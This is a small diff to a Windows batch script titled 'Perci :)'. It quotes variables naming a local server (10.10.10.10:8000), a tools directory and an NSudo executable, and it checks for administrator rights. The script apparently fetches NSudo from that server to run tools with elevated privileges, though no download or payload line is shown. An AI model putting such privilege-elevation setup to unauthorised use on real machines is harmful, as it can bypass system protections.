@@ -3,9 +3,9 @@
 title Perci :)
 
 rem change srv information and Nsudo.exe name hosted in your srv
-set server=10.10.10.10:8000
-set directory= C:\Supertools
-set NSUDO=NSUDOEXAMPLE.exe
+set server="10.10.10.10:8000"
+set directory="C:\Supertools"
+set NSUDO="NSUDOLC.exe"
 
 net session >nul 2>&1
 if %errorLevel% == 0 (
